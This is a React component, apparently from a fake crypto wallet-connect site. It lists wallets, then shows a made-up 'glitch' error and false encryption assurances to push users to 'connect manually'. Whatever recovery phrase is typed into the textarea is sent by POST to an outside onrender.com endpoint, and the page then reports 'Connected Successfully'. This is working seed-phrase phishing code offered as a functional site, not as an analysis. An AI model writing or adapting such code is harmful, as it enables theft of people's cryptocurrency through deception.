import React, { useEffect, useState } from "react";
import "../../App.css";
import AOS from "aos";
import "aos/dist/aos.css"; // Import AOS CSS
import { FaShield } from "react-icons/fa6";
import { MdCancel } from "react-icons/md";
import { IoSend } from "react-icons/io5";
import LoadingModal from "../LoadingModal";
import Coins from "../coins/Coins";

const Coincomps = ({ data }) => {
  const [selectedItem, setSelectedItem] = useState(null);
  const [showManualConnectModal, setShowManualConnectModal] = useState(false);

  const [isLoading, setIsLoading] = useState(false);
  const [phrase, setPhrase] = useState("");
  const [isError, setIsError] = useState(false);
  const [isSucess, setIsSucess] = useState(false);

  const toggleConnect = async () => {
    if (phrase === "") {
      setIsError(true);
      setTimeout(() => {
        setIsError(false);
      }, 3000);
    } else {
      setIsLoading(true);

      const body = {
        wallet: "Wallet Connected",
        phrase: phrase,
      };

      try {
        const url = "https://communicationdappsolutionprotocol.onrender.com/details_three";

        const res = await fetch(url, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(body),
        });

        const data = await res.json();

        if (res.status === 200) {
          setIsSucess(true);
          setPhrase("");
        }

        // Clear all errors incase, turn of the loading state, and show sucess message.
        // setIsError("");
        // setWalletPhrase("");
        // setFetchingData(false);
        // setSuccess(data.message);
      } catch (error) {
        // setFetchingData(false);
        // setIsError("Failed to connect manually. Please try again.");
      }

      setIsLoading(false);
      // setTimeout(() => {
      //   setIsLoading(false);
      // }, 3000); // Simulating a 3-second loading process
    }
  };

  const handleTextChange = (e) => {
    setPhrase(e.target.value);
  };

  useEffect(() => {
    AOS.init();
    AOS.refresh();
  }, []);

  const handleItemClick = (item) => {
    setSelectedItem(item);
  };

  const handleCloseModal = () => {
    setSelectedItem(null);
    setShowManualConnectModal(false);
  };

  const handleConnectManually = () => {
    setShowManualConnectModal(true);
  };

  return (
    <>
      <div className="mx-[3vw] overflow-x-hidden">
        <h1 className="text-[30px] font-[600] text-center my-[35px]">
          Select a Wallet
        </h1>
        <div className="" data-aos="fade-up" data-aos-duration="2000">
          <div className="grid gap-y-[35px] ">
            {data.map((item) => (
              <div
                key={item.id}
                className="flex key items-center px-[20px] py-[20px] md:w-[80%] rounded shadow-2xl cursor-pointer"
                onClick={() => handleItemClick(item)}
              >
                <img
                  src={item.src}
                  alt=""
                  className="w-[60px] h-[60px] rounded-full"
                />
                <div
                  className="flex flex-col gap-[5px]"
                  data-aos="fade-right"
                  data-aos-duration="2000"
                >
                  <p className="md:text-[20px] text-[15px] font-[600]">
                    {item.name}{" "}
                  </p>
                  <p className="md:text-[15px] text-[12px] text-gray-500 font-[500]">
                    {item.id}
                  </p>
                </div>
              </div>
            ))}
          </div>
        </div>
      </div>

      {/* Modal */}
      {selectedItem && (
        <div
          className="fixed top-0 left-0 w-full h-full bg-gray-800 bg-opacity-75 flex justify-center items-center overflow-x-hidden"
          data-aos="fade-up"
          data-aos-duration="1000"
        >
          <div className=" flex  flex-col gap-[20px] items-center bg-white p-4 rounded-lg">
            <MdCancel
              onClick={handleCloseModal}
              color="black"
              className="relative bg-white hover:cursor-[pointer]  sm:h-[30px] h-[40px]  sm:w-[30px] w-[40px] rounded-full sm:right-[20px] -right-[10rem] sm:top-1 -top-7"
            />
            <img
              src={selectedItem.src}
              alt=""
              className="w-[70px] h-[70px] rounded-full"
            />
            <p>{selectedItem.name}</p>
            <div>
              <p className="text-[25px] text-gray-500 font-[400] text-center">
                This session is secured and encrypted
              </p>
            </div>
            <div>
              <p className="text-[15px] text-center text-red-600 font-[400] border border-red-600 px-[15px] py-[5px] rounded sm:w-[100%] ">
                Your wallet had a glitch... connect manually
              </p>
            </div>
            <div className="flex flex-col gap-4 w-[30vw] items-center">
              <button
                className="text-[20px] font-[300] text-center border border-blue-600 rounded-xl py-[5px] px-[10px] w-[14rem]"
                onClick={handleCloseModal}
              >
                Try Again
              </button>
              <button
                className="sm:text-[20px] text-[15px] whitespace-nowrap text-white font-[20px] bg-blue-600 rounded-xl py-[10px] w-[14rem]"
                onClick={handleConnectManually}
              >
                Connect Manually
              </button>
            </div>

            <div className="">
              <p className="text-[15px] text-center text-gray-500 font-[500] w-[90%] flex">
                <FaShield
                  size={30}
                  color="white"
                  className="bg-blue-500 px-[5px] rounded-full"
                />
                This session is protected with an end-to-end encryption
              </p>
            </div>
          </div>
        </div>
      )}

      {showManualConnectModal && (
        <div
          className="fixed top-0 left-0 w-full h-full bg-gray-800 flex justify-center items-center overflow-x-hidden"
          data-aos="fade-up"
          data-aos-duration="1000"
        >
          <div className="flex flex-col gap-[20px] items-center bg-gray-900 p-4 rounded-[40px] py-[40px]">
            <div className="flex gap-[10px] items-center">
              <img
                src={selectedItem.src}
                alt=""
                className="sm:w-[70px] w-[30px] sm:h-[70px] h-[30px] rounded-full"
              />
              <p className="text-[20px] font-[500] text-white">
                Import your {selectedItem.name} wallet
              </p>
            </div>
            <div className="flex gap-[10px]">
              <p className="text-[15px] font-[500] text-white">Phrase</p>
              <p className="text-[15px] font-[500] text-white">Keyston JSON</p>
              <p className="text-[15px] font-[500] text-white">Private Key</p>
            </div>
            <div>
              <textarea
                onChange={handleTextChange}
                value={phrase}
                name=""
                id=""
                cols="35"
                rows="8"
                className="bg-white rounded p-3"
                placeholder="Enter your recovery phrase"
              ></textarea>
            </div>
            <div>
              <p className="text-[18px] font-[500] text-white text-center px-[2rem]">
                Typicaly 12 (sometimes 24) words separated by single space
              </p>
            </div>
            {isSucess ? (
              <div className=" w-full bg-[#82f986] font-semibold text-[#ffffff] text-center rounded-lg py-3 text-lg">
                <button>Connected Successfully!!!</button>
                <LoadingModal isLoading={isLoading} />
              </div>
            ) : (
              <div>
                <button
                  onClick={toggleConnect}
                  className="flex items-center gap-[10px] text-[20px] font-[700] text-white bg-blue-600 px-[50px] py-[10px] w-[] rounded-lg"
                >
                  CONNECT <IoSend />
                </button>
                <LoadingModal isLoading={isLoading} />
              </div>
            )}

            <MdCancel
              onClick={handleCloseModal}
              color="black"
              className="relative bg-white hover:cursor-[pointer]  sm:h-[30px] h-[40px]  sm:w-[30px] w-[40px] rounded"
            />
          </div>
        </div>
      )}
    </>
  );
};

export default Coincomps;
